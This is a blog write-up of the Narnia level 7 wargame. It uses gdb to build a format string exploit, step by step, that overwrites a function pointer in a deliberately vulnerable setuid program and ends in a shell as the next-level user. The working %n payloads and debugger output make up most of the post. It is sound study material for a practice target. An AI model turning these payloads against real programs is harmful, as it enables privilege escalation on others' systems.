---
layout: post
title:  "Buffer Overflows: Narnia7"
date:   2017-07-18 14:15:50 -0400
categories: master
---

The source code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;
  
        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}
int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);
        
        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	fflush(stdout);
        system("/bin/sh");

        return 0;
}
```

The vulnerability in this exercise lies in `vuln()`:
```
snprintf(buffer, sizeof buffer, format);
```
The `snprintf` function writes from `format`, which is our argument, to `buffer`, with a max length of `sizeof buffer`. This function is vulnerable to format string exploitation, which we will use to over-write  the pointer `*ptrf` to point to `hackedfunction()` and get our shell. 

We'll set a breakpoint after `snprintf()`:
```
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd <+0>:	push   ebp
   0x080485ce <+1>:	mov    ebp,esp
   0x080485d0 <+3>:	sub    esp,0xa8
   0x080485d6 <+9>:	mov    DWORD PTR [esp+0x8],0x80
[snip]
   0x08048680 <+179>:	call   0x80484c0 <snprintf@plt>
   0x08048685 <+184>:	mov    eax,DWORD PTR [ebp-0x8c]
   0x0804868b <+190>:	call   eax
   0x0804868d <+192>:	leave  
   0x0804868e <+193>:	ret    
End of assembler dump.
(gdb) break *vuln+184
Breakpoint 1 at 0x8048685
```
Let's do a test run:
```
(gdb) run AAAAAAAAAAAAAAA
Starting program: /narnia/narnia7 AAAAAAAAAAAAAAA
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd68c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd670:	0xffffd690	0x00000080	0xffffd903	0x08048238
0xffffd680:	0xffffd6e8	0xf7ffda94	0x00000000	0x080486e0[1]
0xffffd690:	0x41414141	0x41414141	0x41414141	0x00414141
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```
`[1]` is the value of `ptrf` that we need to overwrite. It currently points to `goodfunction`. Creating a breakpoint at `goodfunction` reveals this:
```
(gdb) break goodfunction
Breakpoint 2 at 0x80486e6
```
To start off, we'll need to include the location of `ptrf` into our buffer:
```
(gdb) run $(python -c 'print "A" * 8 + "\x8c\xd6\xff\xff" + "\x8d\xd6\xff\xff" + "\x8e\xd6\xff\xff" + "\x8f\xd6\xff\xff" + "%8$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia7 $(python -c 'print "A" * 8 + "\x8c\xd6\xff\xff" + "\x8d\xd6\xff\xff" + "\x8e\xd6\xff\xff" + "\x8f\xd6\xff\xff" + "%8$n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd67c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd660:	0xffffd680	0x00000080	0xffffd8f6	0x08048238
0xffffd670:	0xffffd6d8	0xf7ffda94	0x00000000	0x080486e0[1]
0xffffd680:	0x41414141	0x41414141	0xffffd68c	0x00000018[2]
0xffffd690:	0xffffd68e	0xffffd68f	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
```
We see that a longer input modifies the stack location, so we'll have to account for this.
```
(gdb) run $(python -c 'print "A" * 8 + "\x7c\xd6\xff\xff" + "\x7d\xd6\xff\xff" + "\x7e\xd6\xff\xff" + "\x7f\xd6\xff\xff" + "%8$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
[snip]
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd660:	0xffffd680	0x00000080	0xffffd8f6	0x08048238
0xffffd670:	0xffffd6d8	0xf7ffda94	0x00000000	0x00000018[1]
0xffffd680:	0x41414141	0x41414141	0xffffd67c	0xffffd67d
0xffffd690:	0xffffd67e	0xffffd67f	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) cont
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000018 in ?? ()
(gdb) 
```
We have successfully overwritten `ptrf`. 
```
(gdb) run $(python -c 'print "A" * 8 + "\x7c\xd6\xff\xff" + "\x7d\xd6\xff\xff" + "\x7e\xd6\xff\xff" + "\x7f\xd6\xff\xff" + "%8$n" + "%9$n" + "%10$n" + "%11$n"')
The program being debugged has been started already.
[snip]
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd650:	0xffffd670	0x00000080	0xffffd8e8	0x08048238
0xffffd660:	0xffffd6c8	0xf7ffda94	0x00000000	0x080486e0[1]
0xffffd670:	0x41414141	0x41414141	0xffffd67c	0x18181818[2]
0xffffd680:	0xff000000	0xffffd67f	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
```
We increased the buffer, so our stack location is modified again.
```
(gdb) run $(python -c 'print "A" * 8 + "\x6c\xd6\xff\xff" + "\x6d\xd6\xff\xff" + "\x6e\xd6\xff\xff" + "\x6f\xd6\xff\xff" + "%8$n" + "%9$n" + "%10$n" + "%11$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia7 $(python -c 'print "A" * 8 + "\x6c\xd6\xff\xff" + "\x6d\xd6\xff\xff" + "\x6e\xd6\xff\xff" + "\x6f\xd6\xff\xff" + "%8$n" + "%9$n" + "%10$n" + "%11$n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd66c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd650:	0xffffd670	0x00000080	0xffffd8e8	0x08048238
0xffffd660:	0xffffd6c8	0xf7ffda94	0x00000000	0x18181818[1]
0xffffd670:	0x41000000	0x41414141	0xffffd66c	0xffffd66d
0xffffd680:	0xffffd66e	0xffffd66f	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```

We now need to overwrite the value of `ptrf` with the address of `hackedfunction()`, which is `0x8048706`
We currently have 18 bytes written, when we need 06.
```
(gdb) p 0x106 - 0x18
$1 = 238
```

```
(gdb) run $(python -c 'print "A" * 8 + "\x6c\xd6\xff\xff" + "\x6d\xd6\xff\xff" + "\x6e\xd6\xff\xff" + "\x6f\xd6\xff\xff" + "%238x%8$n" + "%9$n" + "%10$n" + "%11$n"')
[snip]
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd650:	0xffffd670	0x00000080	0xffffd8e3	0x08048238
0xffffd660:	0xffffd6c8	0xf7ffda94	0x00000000	0x06060606[1]
0xffffd670:	0x41000001	0x41414141	0xffffd66c	0xffffd66d
0xffffd680:	0xffffd66e	0xffffd66f	0x20202020	0x20202020
0xffffd690:	0x20202020	0x20202020	0x20202020	0x20202020
(gdb) 
```
We have our first value. You can also see the effect that `%238x` has on our buffer with the rows of 0x20, the ascii value of space, in our buffer.

Now to repeat the process until the entire address is written.
```
(gdb) p 0x87 - 0x06
$6 = 129
```

```
(gdb) run $(python -c 'print "A" * 8 + "\x6c\xd6\xff\xff" + "\x6d\xd6\xff\xff" + "\x6e\xd6\xff\xff" + "\x6f\xd6\xff\xff" + "%238x%8$n" + "%129x%9$n" + "%10$n" + "%11$n"')
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd640:	0xffffd660	0x00000080	0xffffd8de	0x08048238
0xffffd650:	0xffffd6b8	0xf7ffda94	0x00000000	0x080486e0
0xffffd660:	0x41414141	0x41414141	0xffffd66c	0x87878706
0xffffd670:	0xff000001	0xffffd66f	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x20202020
(gdb)  
```
The stack value once again get modified as the length of our buffer increases.
```
(gdb) p 0x104 - 0x87
$8 = 125
```
```
(gdb) run $(python -c 'print "A" * 8 + "\x5c\xd6\xff\xff" + "\x5d\xd6\xff\xff" + "\x5e\xd6\xff\xff" + "\x5f\xd6\xff\xff" + "%238x%8$n" + "%129x%9$n" + "%125x%10$n" + "%11$n"')
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd640:	0xffffd660	0x00000080	0xffffd8d9	0x08048238
0xffffd650:	0xffffd6b8	0xf7ffda94	0x00000000	0x04048706
0xffffd660:	0x41000002	0x41414141	0xffffd65c	0xffffd65d
0xffffd670:	0xffffd65e	0xffffd65f	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x20202020
(gdb) 
```

```
(gdb) p 0x08 - 0x04
$9 = 4
```
```
(gdb) run $(python -c 'print "A" * 8 + "\x5c\xd6\xff\xff" + "\x5d\xd6\xff\xff" + "\x5e\xd6\xff\xff" + "\x5f\xd6\xff\xff" + "%238x%8$n" + "%129x%9$n" + "%125x%10$n" + "%04x%11$n"')
Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/20xw $esp
0xffffd640:	0xffffd660	0x00000080	0xffffd8d5	0x08048238
0xffffd650:	0xffffd6b8	0xf7ffda94	0x00000000	0x08048706
0xffffd660:	0x41000002	0x41414141	0xffffd65c	0xffffd65d
0xffffd670:	0xffffd65e	0xffffd65f	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x20202020
(gdb) cont
Continuing.
Way to go!!!!$ 
```
And there we have it. Now to run the program outside of gdb. As gdb changes the location of the stack, we'll have to do some guesswork. After a little bit of fuzzing, we get our shell:
```
narnia7@narnia:/narnia$ /narnia/narnia7 $(python -c 'print "A" * 8 + "\x3c\xd6\xff\xff" + "\x3d\xd6\xff\xff" + "\x3e\xd6\xff\xff" + "\x3f\xd6\xff\xff" + "%238x%8$n" + "%129x%9$n" + "%125x%10$n" + "%04x%11$n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd63c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ 
```

